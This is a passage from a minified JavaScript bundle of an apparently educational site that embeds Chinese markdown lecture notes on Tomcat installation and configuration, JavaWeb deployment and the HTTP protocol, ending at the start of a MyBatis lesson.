noreferrer"}},[n._v("https://www.runoob.com/jsp/jsp-jstl.html")])])])}],ct={},pt=ct,ut=Object(u["a"])(pt,ot,lt,!1,null,"503f0b1b",null),mt=ut.exports,dt=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},gt=[],bt='# Tomcat&Http协议-授课\n\n# 1 企业开发简介\n\n## 1.1 JavaEE规范\n\n`JavaEE`规范是`J2EE`规范的新名称，早期被称为`J2EE`规范，其全称是`Java 2 Platform Enterprise Edition`，它是由SUN公司领导、各厂家共同制定并得到广泛认可的工业标准（`JCP`组织成员）。之所以改名为`JavaEE`，目的还是让大家清楚`J2EE`只是`Java`企业应用。在2004年底中国软件技术大会`Ioc`微容器(也就是`Jdon`框架的实现原理)演讲中指出：我们需要一个跨`J2SE/WEB/EJB`的微容器，保护我们的业务核心组件，以延续它的生命力，而不是依赖`J2SE/J2EE`版本.此次`J2EE`改名为`Java EE`，实际也反映出业界这种共同心声。\n\n`JavaEE`规范是很多`Java`开发技术的总称。这些技术规范都是沿用自`J2EE`的。一共包括了13个技术规范。例如：`jsp/servlet`，`jndi`，`jaxp`，`jdbc`，`jni`，`jaxb`，`jmf`，`jta`，`jpa`，`EJB`等。\n\n其中，`JCP`组织的全称是`Java Community Process`。它是一个开放的国际组织，主要由`Java`开发者以及被授权者组成，职能是发展和更新。成立于1998年。官网是：[JCP](https://jcp.org/en/home/index)\n\n`JavaEE`的版本是延续了`J2EE`的版本，但是没有继续采用其命名规则。`J2EE`的版本从1.0开始到1.4结束，而`JavaEE`版本是从`JavaEE 5`版本开始，目前最新的的版本是`JavaEE 8`。\n\n详情请参考：[JavaEE8规范概览](https://www.oracle.com/technetwork/cn/java/javaee/overview/index.html)\n\n## 1.2 Web概述\n\nWeb在英文中的含义是网状物，网络。在计算机领域，它通常指的是后者，即<b>网络</b>。像我们前面接触的`WWW`，它是由3个单词组成的，即：`World Wide Web `，中文含义是<b>万维网</b>。而我们前面学的`HTML`，`CSS`和`JS`的参考文档《`W3School`全套教程》中的`W3C`就是万维网联盟。他们的出现都是为了让我们在网络的世界中获取资源，这些资源的存放之处，我们称之为<b><font color=\'red\'>网站</font></b>。我们通过输入网站的地址（即：网址），就可以访问网站中提供的资源。在网上我们能访问到的内容全是资源（不区分局域网还是广域网）。只不过，不同类型的资源展示的效果不一样。\n\n首先，我们先来介绍资源的分类，它分为静态资源和动态资源。其中：\n\n静态资源指的是，网站中提供给人们展示的资源是一成不变的，也就是说不同人或者在不同时间，看到的内容都是一样的。例如：我们看到的新闻，网站的使用手册，网站功能说明文档等等。而作为开发者，我们编写的`html`,`css`,`js`,图片，多媒体等等都可以称为静态资源。\n\n动态资源它指的是，网站中提供给人们展示的资源是由程序产生的，在不同的时间或者用不同的人员由于身份的不同，所看到的内容是不一样的。例如：我们在12306上购买火车票，火车票的余票数由于时间的变化，会逐渐的减少，直到最后没有余票。还有，我们在`CSDN`上下载资料，只有登录成功后，且积分足够时才能下载。否则就不能下载，这就是访客身份和会员身份的区别。作为开发人员，我们编写的`JSP`，`servlet`，`php`，`ASP`等都是动态资源。\n\n关于广域网和局域网的划分，广域网指的就是万维网，也就是我们说的互联网。局域网是指的是在一定范围之内可以访问的网络，出了这个范围，就不能再使用的网络。\n\n## 1.3 系统结构\n\n### 1.3.1 系统结构简介\n\n在我们前面课程的学习中，开发的都是`Java`工程。这些工程在企业中称之为项目或者产品。项目也好，产品也罢，它是有系统架构的，系统架构的划分有很多种方式。我们今天讨论的是基础结构上的划分。除此之外，还有技术选型划分，部署方式划分等等。\n\n基础结构划分：C/S结构，B/S结构两类。\n\n技术选型划分：Model1模型，Model2模型，MVC模型和三层架构+MVC模型。\n\n部署方式划分：一体化架构，垂直拆分架构，分布式架构，流动计算架构，微服务架构。\n\n### 1.3.2 C/S结构\n\n它指的是客户端——服务器的方式。其中C代表着Client，S代表着服务器。C/S结构的系统设计图如下：\n\n![CS结构图](./img/java/javaweb/Tomcat&Http协议-授课.assets/CS结构图.jpg)\n\n### 1.3.3 B/S结构\n\n它指的是浏览器——服务器的方式。其中B代表着Browser，S代表着服务器。B/S结构的系统设计图如下：\n\n![BS结构图](./img/java/javaweb/Tomcat&Http协议-授课.assets/BS结构图.jpg)\n\n### 1.3.4 两种结构的区别及优略\n\n**两种结构的区别**\n\n第一：硬件环境不同，C/S通常是建立在专用的网络或小范围的网络环境上（即局域网），且必须要安装客户端。而B/S是建立在广域网上的，适应范围强，通常有操作系统和浏览器就行。\n\n第二：C/S结构比B/S结构更安全，因为用户群相对固定，对信息的保护更强。\n\n第三：B/S结构维护升级比较简单，而C/S结构维护升级相对困难。\n\n**优略**\n\n1 C/S：是能充分发挥客户端PC的处理能力，很多工作可以在客户端处理后再提交给服务器。对应的优点就是客户端响应速度快。\n\n2 B/S：总体拥有成本低、维护方便、 分布性强、开发简单，可以不用安装任何专门的软件就能 实现在任何地方进行操作，客户端零维护，系统的扩展非常容易，只要有一台能上网的电脑就能使用。\n\n**关于课程中结构的选择**\n\n<b><font color=\'red\'>我们的课程中涉及的系统结构都是是基于B/S结构。</font></b>\n\n# 2 Tomcat\n\n## 2.1 Tomcat介绍\n\n### 2.1.1 关于服务器\n\n服务器的概念非常的广泛，它可以指代一台特殊的计算机（相比普通计算机运行更快、负载更高、价格更贵），也可以指代用于部署网站的应用。我们这里说的服务器，其实是web服务器，或者应用服务器。它本质就是一个软件，一个应用。作用就是发布我们的应用（工程），让用户可以通过浏览器访问我们的应用。\n\n常见的应用服务器，请看下表：\n\n| 服务器名称  | 说明                                                  |\n| ----------- | ----------------------------------------------------- |\n| weblogic    | 实现了javaEE规范，重量级服务器，又称为javaEE容器      |\n| websphereAS | 实现了javaEE规范，重量级服务器。                      |\n| JBOSSAS     | 实现了JavaEE规范，重量级服务器。免费的。              |\n| Tomcat      | 实现了jsp/servlet规范，是一个轻量级服务器，开源免费。 |\n\n### 2.1.2 Tomcat下载与安装\n\n[Tomcat官网下载地址](http://tomcat.apache.org/)\n\n![tomcat官网](./img/java/javaweb/Tomcat&Http协议-授课.assets/tomcat官网.png)\n\n### 2.1.3 Tomcat各版本所需支持\n\n![Tomcat各版本使用技术支持](./img/java/javaweb/Tomcat&Http协议-授课.assets/Tomcat各版本使用技术支持.png)\n\n### 2.1.4 Tomcat目录结构详解\n\n![tomcat目录结构详解](./img/java/javaweb/Tomcat&Http协议-授课.assets/tomcat目录结构详解.png)\n\n## 2.2 Tomcat基本使用\n\n### 2.2.1 Tomcat启动和停止及问题分析解决\n\n#### 1）启动和停止\n\nTomcat服务器的启动文件在二进制文件目录中：![1574762703742](./img/java/javaweb/Tomcat&Http协议-授课.assets/1574762703742.png)，这两个文件就是Tomcat的启动文件。\n\nTomcat服务器的停止文件也在二进制文件目录中：![1574762805135](./img/java/javaweb/Tomcat&Http协议-授课.assets/1574762805135.png)，这两个文件就是Tomcat的停止文件。\n\n其中`.bat`文件是针对`windows`系统的运行程序，`.sh`文件是针对`linux`系统的运行程序。\n\n#### 2）启动问题\n\n**第一个问题：启动一闪而过**\n\n原因：没有配置环境变量。\n\n解决办法：配置上JAVA_HOME环境变量\n\n**第二个：Address already in use : JVM_Bind**\n\n![1574768107180](./img/java/javaweb/Tomcat&Http协议-授课.assets/1574768107180.png)\n\n原因：端口被占用\n\n解决办法：找到占用该端口的应用\n\n​                    进程不重要：使用cmd命令：netstat -a -o 查看pid  在任务管理器中结束占用端口的进程。\n\n​                    进程很重要：修改自己的端口号。修改的是Tomcat目录下`\\conf\\server.xml`中的配置。\n\n​\t\t\t![1574768222804](./img/java/javaweb/Tomcat&Http协议-授课.assets/1574768222804.png)\n\n**第三个：启动产生很多异常，但能正常启动**\n\n原因：Tomcat中部署着很多项目，每次启动这些项目都会启动。而这些项目中有启动报异常的。\n\n解决办法：\n\n​\t\t\t能找到报异常的项目，就把它从发布目录中移除。\n\n​\t\t\t不能确定报异常的项目，就重新解压一个新的Tomcat。\n\n**第四个：其它问题**\n\n例如：启动产生异常，但是不能正常启动。此时就需要解压一个新的Tomcat启动，来确定是系统问题，还是Tomcat的问题。\n\n所以，此时就需要具体问题，具体分析，然后再对症解决。\n\n### 2.2.2 IDEA集成Tomcat服务器\n\n**第一步**\n\n![IDEA配置Tomcat1](./img/java/javaweb/Tomcat&Http协议-授课.assets/IDEA配置Tomcat1.png)\n\n**第二步**\n\n![IDEA配置Tomcat2](./img/java/javaweb/Tomcat&Http协议-授课.assets/IDEA配置Tomcat2.png)\n\n**第三步**\n\n![IDEA配置Tomcat3](./img/java/javaweb/Tomcat&Http协议-授课.assets/IDEA配置Tomcat3.png)\n\n**第四步**\n\n![IDEA配置Tomcat4](./img/java/javaweb/Tomcat&Http协议-授课.assets/IDEA配置Tomcat4.png)\n\n### 2.2.3 Linux系统安装Tomcat\n\n**第一步：下载tomcat**\n\n参考**2.1.2小节的《Tomcat下载与安装》**进入Tomcat官网，找到对应版本点击`download`进入下载页面，如下图：\n\n![Linux版Tomcat](./img/java/javaweb/Tomcat&Http协议-授课.assets/Linux版Tomcat.png)\n\n**第二步：上传到linux**\n\n在crt上 使用 alt+p \n将windows上的软件拖进去即可(root目录)\n\n**第三步：在 /usr/local 新建一个文件夹tomcat**\n\n```\nmkdir /usr/local/tomcat\n```\n\n**第四步：移动 tomcat...tar.gz 到 /usr/local/tomcat**\n\n```\nmv apache-tomcat-8.5.32.tar.gz /usr/local/tomcat/\n```\n\n**第五步：进入/usr/local/tomcat目录,解压Tomcat**\n\n```\ncd /usr/local/tomcat\ntar -xvf apache-tomcat-8.5.32.tar.gz\n```\n\n**第六步：进入 /usr/local/tomcat/apache-tomcat-8.5.32/bin**\n\n```\ncd /usr/local/tomcat/apache-tomcat-8.5.32/bin\n```\n\n**第七步：启动tomcat**\n\n```\n方式1:\n\tsh startup.sh\n方式2:\n\t./startup.sh\n```\n\n**第八步：修改防火墙的规则 **\n\n```\n方式1:service iptables stop  关闭防火墙(不建议); 用到哪一个端口号就放行哪一个(80,8080,3306...)\n\n方式2:放行8080 端口\n\t修改配置文件\n\t\tcd /etc/sysconfig\n\t\tvi iptables\n\t\t\t复制(yy , p)\t\n\t\t\t\t-A INPUT -m state --state NEW -m tcp -p tcp --dport 22 -j ACCEPT\n\t\t\t改成\n\t\t\t\t-A INPUT -m state --state NEW -m tcp -p tcp --dport 8080 -j ACCEPT\n\t\t重启加载防火墙或者重启防火墙\n\t\t\tservice iptables reload  \n\t\t\t或者\n\t\t\tservice iptables restart\n```\n\n## 2.3 Tomcat发布应用-JavaWeb应用\n\n### 2.3.1 JavaWeb工程概述\n\n`JavaWeb`应用是一个全新的应用种类。这类应用程序指供浏览器访问的程序，通常也简称为web应用。\n\n一个web应用由多个静态web资源和动态web资源组成，例如：html、css、js文件，jsp文件、java程序、支持jar包、工程配置文件、图片、音视频等等。\n\nWeb应用开发好后，若想供外界访问，需要把web应用所在目录交给Web服务器管理（Tomcat就是Web服务器之一），这个过程称之为虚似目录的映射。\n\n### 2.3.2 JavaWeb应用目录结构详解\n\n![1574768644245](./img/java/javaweb/Tomcat&Http协议-授课.assets/1574768644245.png)\n\n```\nmyapp--------------应用名称\n    1.html\n    css/css.css\n    js/demo.js\n\tWEB-INF--------如果有web.xml或者.class文件时，该目录必须存在，且严格区分大小写。\n\t\t   --------该目录下的资源，客户端是无法直接访问的。\n           --------目录中内容如下：\n        classes目录----------------web应用的class文件（加载顺序：我们的class，lib目录中的jar包，tomcat的lib目录中的jar包。优先级依次降低）\n        lib目录--------------------web应用所需的jar包（tomcat的lib目录下jar为所有应用共享）\n        web.xml-------------------web应用的主配置文件\n```\n\n### 2.3.3 JavaWeb应用的创建\n\n**第一步**\n\n![IDEA创建Javaweb工程](./img/java/javaweb/Tomcat&Http协议-授课.assets/IDEA创建Javaweb工程.png)\n\n**第二步**\n\n![创建Javaweb工程2](./img/java/javaweb/Tomcat&Http协议-授课.assets/创建Javaweb工程2.png)\n\n**第三步**\n\n![创建Javaweb工程3](./img/java/javaweb/Tomcat&Http协议-授课.assets/创建Javaweb工程3.png)\n\n**第四步**\n\n![创建Javaweb工程4](./img/java/javaweb/Tomcat&Http协议-授课.assets/创建Javaweb工程4.png)\n\n### 2.3.4 JavaWeb应用的部署\n\n#### 1）IDEA部署\n\n**第一步**\n\n![IDEA发布工程1](./img/java/javaweb/Tomcat&Http协议-授课.assets/IDEA发布工程1.png)\n\n**第二步**\n\n![IDEA发布工程2](./img/java/javaweb/Tomcat&Http协议-授课.assets/IDEA发布工程2.png)\n\n**第三步**\n\n![IDEA发布工程3-启动服务](./img/java/javaweb/Tomcat&Http协议-授课.assets/IDEA发布工程3-启动服务.png)\n\n#### 2）war包发布\n\n**第一步：使用<b>`jar -cvf war` <font color=\'blue\'>包的名称</font>  <font color=\'purple\'>当前目录中哪些资源要打入war</font></b>**\n\n![jar命令](./img/java/javaweb/Tomcat&Http协议-授课.assets/jar命令.png)\n\n![war包](./img/java/javaweb/Tomcat&Http协议-授课.assets/war包.png)\n\n**第二步：把打好的war拷贝到tomcat的webapps目录中**\n\n![拷贝war包到webapps](./img/java/javaweb/Tomcat&Http协议-授课.assets/拷贝war包到webapps.png)\n\n**第三步：启动服务时，tomcat会自动解压。**\n\n![启动Tomcat自动解压war包](./img/java/javaweb/Tomcat&Http协议-授课.assets/启动Tomcat自动解压war包.png)\n\n### 2.4.1 Tomcat配置虚拟目录\n\n虚拟目录的配置，支持两种方式。第一种是通过在主配置文件中添加标签实现。第二种是通过写一个独立配置文件实现。\n\n第一种方式：在`server.xml`的`<Host>`元素中加一个`<Context path="" docBase=""/>`元素。\n​\t\t\t\t\t `path`：访问资源URI。URI名称可以随便起，但是必须在前面加上一个/\n​\t\t\t\t\t`docBase`：资源所在的磁盘物理地址。\n第二种方式：是写一个独立的`xml`文件，该文件名可以随便起。在文件内写一个`<Context/>`元素。\n​\t\t\t\t\t该文件要放在Tomcat目录中的`conf\\Catalina\\localhost\\`目录下。\n需要注意的是，在使用了独立的配置文件之后，访问资源URI就变成了<b><font color=\'red\'>/+文件的名称</font></b>。而`Context`的`path`属性就失效了。\n\n### 2.4.2 Tomcat配置虚拟主机\n\n在`<Engine>`元素中添加一个`<Host name="" appBase="" unparkWARs="" autoDeploy="" />`，其中：\n​\t\t`name`：指定主机的名称\n​\t\t`appBase`：当前主机的应用发布目录\n​\t\t`unparkWARs`：启动时是否自动解压war包\n​\t\t`autoDeploy`：是否自动发布\n\n配置示例如下：\n\n```xml\n<Host name="www.itcast.cn" appBase="D:\\itcastapps" unpackWARs="true" autoDeploy="true"/>\n\n<Host name="www.itheima.com" appBase="D:\\itheimaapps" unpackWARs="true" autoDeploy="true"/>\n```\n\n### 2.4.3 Tomcat默认项配置\n\n**配置默认端口**\n\nTomcat服务器主配置文件中配置着访问端口，它在配置文件中写的值是：8080。但是它不是Tomcat的默认端口。我们此处说的默认端口是，当使用默认值的时候，端口号可以省略。Tomcat的默认端口是<b><font color=\'red\'>80</font></b>。\n\n配置方式如下：\n\n```xml\n<Connector port="80" protocol="HTTP/1.1" connectionTimeout="20000" redirectPort="8443" />\t\t\n```\n\n**配置默认应用**\n\n有两种方式配置默认应用。\n第一种：把要作为默认应用的应用，名称改为`ROOT`。放到`webapps`目录中。\n\n![默认应用1](./img/java/javaweb/Tomcat&Http协议-授课.assets/默认应用1.png)\n\n第二种：写一个独立的配置文件，文件名称为`ROOT.xml`。\n​\t\t\t\t注意：`ROOT`必须大写。当使用了独立的`ROOT.xml`文件时，`webapps`下`ROOT`应用就不是默认应用了。\n\n![默认应用2](./img/java/javaweb/Tomcat&Http协议-授课.assets/默认应用2.png)\n\n**配置默认主页**\n\n首先要明确的是，配置默认主页是针对应用说的。是应用的默认主页。\n在应用的web.xml中配置：\n\n```xml\n<welcome-file-list>\n    <welcome-file>默认主页</welcome-file>\n</welcome-file-list>\n```\n\n例如：\n\n```xml\n<welcome-file-list>\n    <welcome-file>index.html</welcome-file>\n    <welcome-file>index.htm</welcome-file>\n    <welcome-file>index.jsp</welcome-file>\n</welcome-file-list>\n```\n\n# 3 HTTP协议\n\n## 3.1 HTTP协议概述\n\n### 3.1.1 HTTP协议概念\n\nHTTP的全称是：Hyper Text Transfer Protocol，意为 超文本传输协议。它指的是服务器和客户端之间交互必须遵循的一问一答的规则。形容这个规则：问答机制、握手机制。\n\n它规范了请求和响应内容的类型和格式。\n\nHTTP协议是由`W3C`组织管理和维护的。\n\n### 3.1.2 HTTP协议版本\n\n目前HTTP协议主要是1.0版本和1.1版本。这两个版本的区别主要是两个方面。\n\n第一：HTTP1.1版本比1.0版本多了一些消息头。\n\n第二：HTTP1.1版本和1.0版本的执行过程不一样。执行过程如下：\n\n| HTTP1.0            | HTTP1.1                |\n| ------------------ | ---------------------- |\n| 创建连接（TCP/IP） | 创建连接（TCP/IP）     |\n| 发送请求           | 发送请求1              |\n| 得到响应           | 得到响应1              |\n| 关闭连接           | 发送请求2              |\n| 创建连接（TCP/IP） | 得到响应2              |\n| 发送请求           | .......                |\n| 得到响应           | .......                |\n| 关闭连接           | 连接超时或手动关闭连接 |\n\n### 3.1.3 HTTP协议相关说明\n\nHTTP协议概念是客户浏览器和服务器一种一问一答的规则，那么必须要有问有答，而且要先问后答。\n但是我们使用`<script>`,`<link>`和`<img>`标签，没有手动发起请求，但是仍然能从服务器端拿到数据，原因就是：**在浏览器遇到`<script>`,`<link>`,`<img>`标签时会自动发出请求。**\n\n## 3.2 HTTP协议组成\n\n由HTTP协议的概念可知，它分为问和答两部分。其中问指的就是请求部分，而答指的就是响应部分。\n\n### 3.2.1请求部分  \n\n请求行： 永远位于请求的第一行\n请求消息头： 从第二行开始，到第一个空行结束\n请求的正文： 从第一个空行后开始，到正文的结束\n\n![请求部分](./img/java/javaweb/Tomcat&Http协议-授课.assets/请求部分-1574824553003.jpg)\n\n### 3.2.2 响应部分\n\n响应行： 永远位于响应的第一行\n响应消息头： 从第二行开始，到第一个空行结束\n响应的正文： 从第一个空行后开始，到正文的结束\n\n![响应部分](./img/java/javaweb/Tomcat&Http协议-授课.assets/响应部分-1574824560809.jpg)\n\n### 3.3.3 消息头的共性分析\n\n消息头名称首字母大写，多个单词每个单词的首字母都大写。\n多个单词用<b><font color=\'red\'>-</font></b>分隔\n名称和值之间用<b><font color=\'red\'>冒号加空格</font></b>分隔\n多个值之间用<b><font color=\'red\'>逗号加空格</font></b>分隔\n两个头之间用<b><font color=\'red\'>回车</font></b>分隔\n\n## 3.3 请求部分详解\n\n### 3.3.1 请求行详解\n\n请求行：`GET /myapp/2.html HTTP/1.1`\n\n| 内容          | 说明                       |\n| ------------- | -------------------------- |\n| GET           | 请求的方式。（还有POST）   |\n| /myapp/2.html | 请求的资源。               |\n| HTTP/1.1      | 使用的协议，及协议的版本。 |\n\n### 3.3.2 请求消息头详解\n\n| 内容                   | 说明                                                         |\n| ---------------------- | ------------------------------------------------------------ |\n| Accept                 | 告知服务器，客户浏览器所支持的MIME类型。                     |\n| Accept-Encoding        | 告知服务器，客户浏览器所支持的压缩编码格式。最常用的就是gzip压缩。 |\n| Accept-Language        | 告知服务器，客户浏览器所支持的语言。一般都是zh_CN或en_US等。 |\n| Referer                | 告知服务器，当前请求的来源。<br/>只有当前请求有来源的时候，才有这个消息头。从地址栏输入的没有来源。<br/>作用：1 投放广告  2 防盗链 |\n| Content-Type           | 告知服务器，请求正文的MIME类型。                             |\n| Content-Length         | 告知服务器，请求正文的长度。                                 |\n| User-Agent             | 浏览器相关信息                                               |\n| Connection: Keep-Alive | 连接的状态：保持连接                                         |\n| If-Modified-Since      | 告知服务器，客户浏览器缓存文件的最后修改时间。               |\n| Cookie（********）     | 会话管理相关，非常的重要。                                   |\n\n### 3.3.3 请求正文详解\n\n第一：只有post请求方式，才有请求的正文。get方式的正文是在地址栏中的。\n第二：表单的输入域有name属性的才会被提交。不分get和post的请求方式。\n第三：表单的enctype属性取值决定了请求正文的体现形式。概述的含义是：请求正文的MIME编码类型。\n\n| enctype取值                       | 请求正文体现形式                                   | 示例                                                         |\n| --------------------------------- | -------------------------------------------------- | ------------------------------------------------------------ |\n| application/x-www-form-urlencoded | key=value&key=value                                | username=test&password=1234                                  |\n| multipart/form-data               | 此时变成了多部分表单数据。多部分是靠分隔符分隔的。 | -----------------------------7df23a16c0210<br/>Content-Disposition: form-data; name="username"<br/><br/>test<br/>-----------------------------7df23a16c0210<br/>Content-Disposition: form-data; name="password"<br/><br/>1234<br/>-----------------------------7df23a16c0210<br/>Content-Disposition: form-data; name="headfile"; filename="C:\\Users\\zhy\\Desktop\\请求部分.jpg"<br/>Content-Type: image/pjpeg<br/>-----------------------------7df23a16c0210 |\n\n## 3.4 响应部分详解\n\n### 3.4.1 响应行详解\n\n响应行：`HTTP/1.1 200 OK`\n\n| 内容     | 说明             |\n| -------- | ---------------- |\n| HTTP/1.1 | 使用协议的版本。 |\n| 200      | 响应状态码       |\n| OK       | 状态码描述       |\n\n常用状态码介绍：\n\n| 状态码  | 说明                                             |\n| ------- | ------------------------------------------------ |\n| 200     | 一切都OK>                                        |\n| 302/307 | 请求重定向(客户端行为，两次请求，地址栏发生改变) |\n| 304     | 请求资源未发生变化，使用缓存                     |\n| 404     | 请求资源未找到                                   |\n| 500     | 服务器错误                                       |\n\n### 3.4.2 响应消息头详解\n\n| 消息头                  | 说明                                                         |\n| ----------------------- | ------------------------------------------------------------ |\n| Location                | 请求重定向的地址，常与302,307配合使用。                      |\n| Server                  | 服务器相关信息。                                             |\n| Content-Type            | 告知客户浏览器，响应正文的MIME类型。                         |\n| Content-Length          | 告知客户浏览器，响应正文的长度。                             |\n| Content-Encoding        | 告知客户浏览器，响应正文使用的压缩编码格式。常用的gzip压缩。 |\n| Content-Language        | 告知客户浏览器，响应正文的语言。zh_CN或en_US等等。           |\n| Content-Disposition     | 告知客户浏览器，以下载的方式打开响应正文。                   |\n| Refresh                 | 定时刷新                                                     |\n| Last-Modified           | 服务器资源的最后修改时间。                                   |\n| Set-Cookie（*******）   | 会话管理相关，非常的重要                                     |\n| Expires:-1              | 服务器资源到客户浏览器后的缓存时间                           |\n| Catch-Control: no-catch | 不要缓存，//针对http协议1.1版本                              |\n| Pragma:no-catch         | 不要缓存，//针对http协议1.0版本                              |\n\n### 3.4.3 响应正文详解\n\n就和我们在浏览器上右键查看源文件看到的内容是一样的。\n\n```html\n<html>\n    <head>\n        <link rel="stylesheet" href="css.css" type="text/css">\n        <script type="text/javascript" src="demo.js"><\/script>\n    </head>\n    <body>\n        <img src="1.jpg" />\n    </body>\n</html>\n```\n\n# 4 综合案例-Tomcat的具体应用\n\n## 4.1 静态资源案例-门户类网站的部署和访问\n\n### 4.1.1 案例介绍\n\n**需求：**\n\n​\t\t在浏览器中输入地址，访问静态HTML页面。\n\n**细节说明：**\n\n​\t\t把`HTML`和`CSS`课程中制作的页面加入到`JavaWeb`工程中，在Tomcat中部署工程，然后启动Tomcat服务器，并使用浏览器访问。\n\n### 4.1.2 实现步骤\n\n**第一步：创建工程并选择使用的Tomcat版本**\n\n![静态资源工程1](./img/java/javaweb/Tomcat&Http协议-授课.assets/静态资源工程1.png)\n\n![静态资源工程2](./img/java/javaweb/Tomcat&Http协议-授课.assets/静态资源工程2.png)\n\n**第二步：拷贝资源到工程的web目录中**\n\n![静态资源工程3](./img/java/javaweb/Tomcat&Http协议-授课.assets/静态资源工程3.png)\n\n**第三步：在web.xml中配置默认主页**\n\n![静态资源工程4](./img/java/javaweb/Tomcat&Http协议-授课.assets/静态资源工程4.png)\n\n**第四步：部署工程到Tomcat服务器**\n\n![静态资源工程5](./img/java/javaweb/Tomcat&Http协议-授课.assets/静态资源工程5.png)\n\n**第五步：测试浏览器访问**\n\n![静态资源工程6](./img/java/javaweb/Tomcat&Http协议-授课.assets/静态资源工程6.png)\n\n![静态资源工程7](./img/java/javaweb/Tomcat&Http协议-授课.assets/静态资源工程7.png)\n\n## 4.2 动态资源的案例-学生管理系统的部署和访问\n\n### 4.2.1 案例介绍\n\n**需求：**\n\n​\t\t把JavaSE进阶阶段的学生管理系统的服务器改用Tomcat实现。\n\n**细节说明：**\n\n​\t\t把学生管理系统涉及的HTML和样式以及图片文件拷贝到JavaWeb工程中，在Tomcat中部署工程，然后启动Tomcat服务器，并使用浏览器访问。\n\n### 4.2.2 实现步骤\n\n**第一步：创建工程**\n\n![动态资源工程](./img/java/javaweb/Tomcat&Http协议-授课.assets/动态资源工程.png)\n\n![动态资源工程1](./img/java/javaweb/Tomcat&Http协议-授课.assets/动态资源工程1.png)\n\n**第二步：拷贝资源**\n\n![动态资源工程2](./img/java/javaweb/Tomcat&Http协议-授课.assets/动态资源工程2.png)\n\n**第三步：配置默认主页**\n\n![动态资源工程4](./img/java/javaweb/Tomcat&Http协议-授课.assets/动态资源工程4.png)\n\n**第四步：部署项目**\n\n![动态资源工程3](./img/java/javaweb/Tomcat&Http协议-授课.assets/动态资源工程3.png)\n\n### 4.3.2 创建案例中的动态资源-Servlet\n\n#### 1） Servlet简介\n\nServlet翻译成中文是服务端脚本，它是SUN公司推出的一套规范，称为Servlet规范。Servlet规范是JavaEE规范中的一部分。我们可以通过查阅JavaEE规范的API来了解Servlet的基本概念。通过点击[JavaEE8官方文档](https://javaee.github.io/javaee-spec/javadocs/)，就可以看到关于Servlet的内容介绍。\n\n#### 2） 按步骤编写Servlet\n\n**前期准备：在IDEA创建Javaweb工程**\n\n![前期准备](./img/java/javaweb/Tomcat&Http协议-授课.assets/前期准备.png)\n\n**第一步：编写一个普通类实现Servlet接口或者继承GenericServlet类或者继承HttpServlet**\n\n![编写Servlet](./img/java/javaweb/Tomcat&Http协议-授课.assets/编写Servlet.png)\n\n**第二步：重写service方法，输出一句话**\n\n![重写Service方法](./img/java/javaweb/Tomcat&Http协议-授课.assets/重写Service方法.png)\n\n**第三步：在web.xml配置Servlet**\n\n![配置Servlet](./img/java/javaweb/Tomcat&Http协议-授课.assets/配置Servlet.png)\n\n**第四步：启动tomcat服务器测试**\n\n在地址栏输入：http://localhost:8585/crm/studentServlet 测试访问结果 \n\n#### 3）测试访问\n\n![测试访问结果](./img/java/javaweb/Tomcat&Http协议-授课.assets/测试访问结果.png)',vt={data:function(){return{MainComponent:bt}}},ht=vt,St=Object(u["a"])(ht,dt,gt,!1,null,"a775c5dc",null),yt=St.exports,ft={mixins:[sr["a"]],components:{m1:Hr,m2:$r,m3:Zr,m4:st,m5:mt,m6:yt},data:function(){return{tab:"m6",tab_level:2,tabs:[{label:"Tomcat&Http协议",value:"m6"},{label:"Servlet",value:"m1"},{label:"Request&Response",value:"m2"},{label:"Cookie&SessionJsp",value:"m3"},{label:"EL&Filter&Listener",value:"m4"},{label:"JSP",value:"m5"}]}}},_t=ft,xt=Object(u["a"])(_t,Lr,Or,!1,null,"34d52570",null),wt=xt.exports,Et=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t(""+n.tab,{tag:"component"})],1)},Tt=[],kt=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},Ct=[],jt='\x3c!--\n * @Date           : 2021-04-14 00:53:12\n * @FilePath       : /jinnian-space/src/pages/java/module/mybatis/md/mybatis-第1天讲义.md\n * @Description    : \n--\x3e\n## Mybatis 基础\n\n\n\n### 一.Mybatis快速入门\n\n#### 1.1 框架介绍\n\n* 框架是一款半成品软件，我们可以基于这个半成品软件继续开发，来完成我们个性化的需求！\n\n* 如图:\n\n  ![1590919723185](./img/java/mybatis/mybatis-第1天讲义.img/1590919723185.png)\n\n​ \n\n#### 1.2 ORM介绍\n\n* ORM(Object Relational Mapping)： 对象关系映射\n\n* 指的是持久化数据和实体对象的映射模式，为了解决面向对象与关系型数据库存在的互不匹配的现象的技术。\n\n* 如图:\n\n  ![1590919786415](./img/java/mybatis/mybatis-第1天讲义.img/1590919786415.png)\n\n* 具体映射关系如下图:\n\n![1590919824416](./img/java/mybatis/mybatis-第1天讲义.img/1590919824416.png)\n\n#### 1.3 原始jdbc操作（查询数据）\n\n![1590915350408](./img/java/mybatis/mybatis-第1天讲义.img/1590915350408.png)\n\n#### 1.4原始jdbc操作（插入数据）\n\n![1590915389449](./img/java/mybatis/mybatis-第1天讲义.img/1590915389449.png)\n\n#### 1.5 原始jdbc操作的分析\n\n* 原始 JDBC 的操作问题分析 \n\n  ​    1.频繁创建和销毁数据库的连接会造成系统资源浪费从而影响系统性能。\n\n    2. sql 语句在代码中硬编码，如果要修改 sql 语句，就需要修改 java 代码，造成代码不易维护。\n    3. 查询操作时，需要手动将结果集中的数据封装到实体对象中。\n    4. 增删改查操作需要参数时，需要手动将实体对象的数据设置到 sql 语句的占位符。 \n\n* 原始 JDBC 的操作问题解决方案 \n\n  ​    1.使用数据库连接池初始化连接资源。 \n\n  2. 将 sql 语句抽取到配置文件中。 \n  3. 使用反射、内省等底层技术，将实体与表进行属性与字段的自动映射    \n\n#### 1.6 什么是Mybatis\n\nmybatis 是一个优秀的基于java的持久层框架，它内部封装了jdbc，使开发者只需要关注sql语句本身，而不需要花费精力去处理加载驱动、创建连接、创建statement等繁杂的过程。\n\nmybatis通过xml或注解的方式将要执行的各种 statement配置起来，并通过java对象和statement中sql的动态参数进行映射生成最终执行的sql语句。\n\n最后mybatis框架执行sql并将结果映射为java对象并返回。采用ORM思想解决了实体和数据库映射的问题，对jdbc 进行了封装，屏蔽了jdbc api 底层访问细节，使我们不用与jdbc api 打交道，就可以完成对数据库的持久化操作。\n\nMyBatis官网地址：<http://www.mybatis.org/mybatis-3/> \n\n#### 1.7  